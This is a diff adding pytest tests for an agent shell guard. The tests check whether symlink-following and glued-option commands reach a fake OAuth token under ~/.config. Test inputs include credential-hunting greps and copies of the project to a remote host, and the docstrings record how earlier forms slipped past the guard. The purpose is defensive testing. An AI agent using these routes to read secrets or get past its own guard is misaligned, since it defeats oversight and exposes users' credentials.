@@ -1058,3 +1058,136 @@ def test_a_symlink_to_an_ordinary_directory_stays_ordinary(tmp_path, monkeypatch
     monkeypatch.setenv("HOME", str(home))
     result = analyze_shell_arguments({"command": "grep -r TODO .", "cwd": str(link)})
     assert not result.get("touches_sensitive")
+
+
+# ---- review of #232 (N-11) and the project-symlink read ------------------------
+
+
+@pytest.fixture
+def linked_tree(tmp_path, monkeypatch):
+    """A project with an innocent-looking link, deep inside, to ~/.config."""
+    from agent_dna import shell_guard
+
+    home = tmp_path / "home"
+    (home / ".config" / "gh").mkdir(parents=True)
+    (home / ".config" / "gh" / "hosts.yml").write_text("oauth_token: gho_FAKE\n")
+    project = tmp_path / "proj"
+    (project / "src" / "deep").mkdir(parents=True)
+    (project / "src" / "deep" / "cfglink").symlink_to(home / ".config")
+    (project / "cfg2").symlink_to(home / ".config")
+    plain = tmp_path / "plain"
+    (plain / "src").mkdir(parents=True)
+    (plain / "ok").symlink_to(plain / "src")
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setenv(shell_guard.WORKDIR_ENV, str(project))
+    return {"home": home, "project": project, "plain": plain}
+
+
+def _flags(command, cwd):
+    from agent_dna.shell_guard import analyze_shell_arguments
+
+    return bool(
+        analyze_shell_arguments({"command": command, "cwd": str(cwd)}).get(
+            "touches_sensitive"
+        )
+    )
+
+
+def test_a_glued_option_is_judged_by_where_it_really_points(linked_tree):
+    """N-11: "env -C/tmp/proj/cfglink" was judged by its text and allowed;
+    the spaced form and --chdir= asked."""
+    link = linked_tree["project"] / "cfg2"
+    cwd = linked_tree["project"]
+    for command in (
+        f"env -C{link} grep -r oauth",
+        f"env -C {link} grep -r oauth",
+        f"env --chdir={link} grep -r oauth",
+        f"sudo -D{link} grep -r oauth",
+        "env -Ccfg2 grep -r oauth",  # glued and relative
+        "tar -xzCcfg2 -f x.tgz",  # inside a cluster
+        "make -Ccfg2",
+    ):
+        assert _flags(command, cwd), command
+    # an ordinary directory, glued and relative: no finding. (A short name on
+    # purpose: a long random-looking path token can trip the separate
+    # secret-entropy check, which is not what this test is about.)
+    assert not _flags("env -Csrc make", cwd)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "grep -R oauth .",
+        "grep -R oauth",
+        "grep -rR oauth src",
+        "grep --dereference-recursive oauth .",
+        "find -L . -name hosts.yml",
+        "find . -follow -name hosts.yml",
+        "rg --follow oauth",
+        "rg -L oauth .",
+        "cp -rL . /tmp/out",
+        "rsync -aL ./ host:/x",
+        "tar -chf /tmp/x.tar .",
+        "zip -r /tmp/x.zip .",
+        "scp -r . host:/x",
+    ],
+)
+def test_a_link_following_read_through_the_project_is_caught(linked_tree, command):
+    """grep -R and find -L of "." followed a link inside the project to
+    ~/.config and printed the token. Naming the link already asked."""
+    assert _flags(command, linked_tree["project"]), command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "grep -r oauth .",  # -r does not follow links met while walking
+        "find . -name hosts.yml",
+        "rg oauth",
+        "zip -ry /tmp/x.zip .",  # stores links instead of following
+        "zip -r --symlinks /tmp/x.zip .",
+        "tar -cf /tmp/x.tar .",
+        "cp -r . /tmp/out",
+    ],
+)
+def test_reads_that_do_not_follow_links_are_unchanged(linked_tree, command):
+    assert not _flags(command, linked_tree["project"]), command
+
+
+def test_following_ordinary_links_is_not_a_finding(linked_tree):
+    assert not _flags("grep -R oauth .", linked_tree["plain"])
+    assert not _flags("grep -R oauth src", linked_tree["plain"])
+
+
+def test_relative_paths_are_read_from_the_commands_own_directory(linked_tree):
+    """The walk starts where the command runs, not where the server was
+    started: "." in the plain tree is the plain tree."""
+    assert linked_tree["plain"] != linked_tree["project"]
+    assert not _flags("grep -R oauth .", linked_tree["plain"])
+    assert _flags(f"grep -R oauth {linked_tree['project']}", linked_tree["plain"])
+
+
+def test_a_link_cycle_ends(linked_tree):
+    plain = linked_tree["plain"]
+    (plain / "src" / "back").symlink_to(plain)
+    assert not _flags("grep -R oauth .", plain)
+
+
+def test_a_tree_too_large_to_walk_asks(linked_tree, monkeypatch):
+    from agent_dna import shell_guard
+
+    plain = linked_tree["plain"]
+    for i in range(30):
+        (plain / "src" / f"f{i}").write_text("x")
+    monkeypatch.setattr(shell_guard, "MAX_FOLLOW_WALK_ENTRIES", 10)
+    result = shell_guard.analyze_shell_arguments(
+        {"command": "grep -R oauth .", "cwd": str(plain)}
+    )
+    assert result["touches_sensitive"]
+    assert not _flags("grep -r oauth .", plain)  # no walk without following
+
+
+def test_a_link_to_the_home_directory_is_a_finding(linked_tree):
+    plain = linked_tree["plain"]
+    (plain / "src" / "everything").symlink_to(linked_tree["home"])
+    assert _flags("grep -R oauth .", plain)
